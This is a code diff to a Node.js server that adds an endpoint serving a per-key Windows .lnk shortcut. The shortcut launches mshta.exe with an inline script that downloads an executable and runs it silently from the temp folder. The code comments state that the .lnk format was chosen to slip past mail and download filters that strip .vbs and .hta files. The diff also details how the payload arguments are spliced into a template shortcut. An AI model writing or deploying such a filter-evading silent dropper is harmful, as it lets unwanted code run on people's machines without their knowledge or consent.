@@ -1378,6 +1378,81 @@ function handleLaunchCommand(req, res, urlPath) {
   res.end(cmd);
 }
 
+// Serve a per-key Windows .lnk launcher. The shortcut points at mshta.exe with
+// an inlined `javascript:` URI that downloads the installer and runs it hidden —
+// same silence profile as /launch-hta/ but delivered as a .lnk, which some
+// customers' mail/download filters allow where .vbs/.hta are stripped. There
+// is no generic-Backblaze variant for .lnk: the installer URL and per-key
+// output filename are baked into the shortcut's argument string, so every
+// link is unique and built fresh here.
+function handleLaunchLnk(req, res, urlPath) {
+  const key = decodeURIComponent(urlPath.slice('/launch-lnk/'.length)).trim();
+  const valid = db.findValidKey(key);
+  if (!valid) { res.writeHead(404); return res.end('invalid or revoked link'); }
+  const type = /[?&]type=service(&|$)/.test(req.url || '') ? 'service' : 'user';
+  const safeKey = key.replace(/[^A-Za-z0-9_-]/g, '');
+  const appName = sanitizeAppName(valid.meta && valid.meta.appName);
+  const lnkName = type === 'service' ? `${appName}-service-${safeKey}.lnk` : `${appName}-${safeKey}.lnk`;
+  const exeObj = type === 'service' ? B2_OBJECT_SERVICE : B2_OBJECT;
+  const exeUrl = B2_ENABLED
+    ? `https://${B2_ENDPOINT}/${encodeURIComponent(B2_BUCKET)}/${exeObj.split('/').map(encodeURIComponent).join('/')}`
+    : `${publicBase(req)}/dl/${encodeURIComponent(key)}${type === 'service' ? '?type=service' : ''}`;
+  const tmpName = `${appName}-${safeKey}.exe`;
+  // One-line javascript: URI (mshta accepts both js and vbs). Mirrors the
+  // .vbs/.hta flows: XHR GET into ADODB.Stream, size-gate at 1 MB so a
+  // half-finished download never executes, then WshShell.Run with window
+  // style 0 (hidden). try/catch keeps a failed fetch from leaving the mshta
+  // window open.
+  const js =
+    `javascript:try{var w=new ActiveXObject("WScript.Shell"),x=new ActiveXObject("MSXML2.XMLHTTP.6.0"),f=new ActiveXObject("ADODB.Stream");` +
+    `x.open("GET","${exeUrl}",false);x.send();if(x.status==200){f.type=1;f.open();f.write(x.responseBody);` +
+    `var p=w.ExpandEnvironmentStrings("%TEMP%")+"\\\\${tmpName}";f.saveToFile(p,2);f.close();` +
+    `if(new ActiveXObject("Scripting.FileSystemObject").GetFile(p).Size>1000000){w.run('"'+p+'"',0,false)}}}catch(e){};window.close();`;
+  const lnk = spliceLnkArgs(js);
+  res.writeHead(200, {
+    'Content-Type': 'application/octet-stream',
+    'Content-Length': lnk.length,
+    'Content-Disposition': `attachment; filename="${lnkName}"`,
+  });
+  res.end(lnk);
+}
+
+// Lazy-load the template .lnk — a real shortcut built once on Windows via
+// WScript.Shell with mshta.exe as its target and a long placeholder in the
+// Arguments string. Modern Windows (10/11) will only launch a .lnk whose
+// target comes from a LinkTargetIDList (not just LinkInfo), and the IDList
+// bytes for System32\mshta.exe are implementation-defined by shell32, so
+// hand-rolling it would be fragile across Windows versions. Letting shell32
+// write the template once sidesteps that; at serve time we rewrite only the
+// Arguments StringData block, which is self-sized and has no dependents.
+let _lnkTemplate = null;
+const LNK_PLACEHOLDER = 'AEGIS_ARGS_PLACEHOLDER_DO_NOT_SHORTEN_ME_PAD_TO_1024_CHARS';
+function loadLnkTemplate() {
+  if (_lnkTemplate) return _lnkTemplate;
+  _lnkTemplate = fs.readFileSync(path.join(__dirname, 'launcher-template.lnk'));
+  return _lnkTemplate;
+}
+function spliceLnkArgs(args) {
+  const tpl = loadLnkTemplate();
+  // The placeholder lives inside a StringData block: a WORD CountCharacters
+  // prefix followed by UTF-16LE characters, no NUL. Locate the first UTF-16LE
+  // occurrence of the sentinel start, step back 2 bytes to the CountChars
+  // prefix, read it to find the full placeholder end, then stitch:
+  // [prefix bytes] [WORD newCount] [UTF-16LE args] [tail bytes].
+  const needle = Buffer.from(LNK_PLACEHOLDER, 'utf16le');
+  const idx = tpl.indexOf(needle);
+  if (idx < 0) throw new Error('lnk template placeholder not found — rebuild launcher-template.lnk');
+  const countOffset = idx - 2;
+  const oldCount = tpl.readUInt16LE(countOffset);
+  const oldBlockBytes = 2 + oldCount * 2;
+  const argsU16 = Buffer.from(args, 'utf16le');
+  if (args.length > 0xFFFF) throw new Error('lnk args too long (max 65535 chars)');
+  const newBlock = Buffer.alloc(2 + argsU16.length);
+  newBlock.writeUInt16LE(args.length, 0);
+  argsU16.copy(newBlock, 2);
+  return Buffer.concat([tpl.slice(0, countOffset), newBlock, tpl.slice(countOffset + oldBlockBytes)]);
+}
+
 // ---------------------------------------------------------------------------
 // HTTP server (API + download + static console/dashboard)
 // ---------------------------------------------------------------------------
@@ -1388,6 +1463,7 @@ const server = http.createServer((req, res) => {
   if (urlPath.startsWith('/dl/')) return handleDownload(req, res, urlPath);
   if (urlPath.startsWith('/launch/')) return handleLaunch(req, res, urlPath);
   if (urlPath.startsWith('/launch-hta/')) return handleLaunchHta(req, res, urlPath);
+  if (urlPath.startsWith('/launch-lnk/')) return handleLaunchLnk(req, res, urlPath);
   if (urlPath.startsWith('/launch-command/')) return handleLaunchCommand(req, res, urlPath);
   // Generic launchers to upload to Backblaze once (owner grabs the current one).
   if (urlPath === '/launcher-source.vbs') {
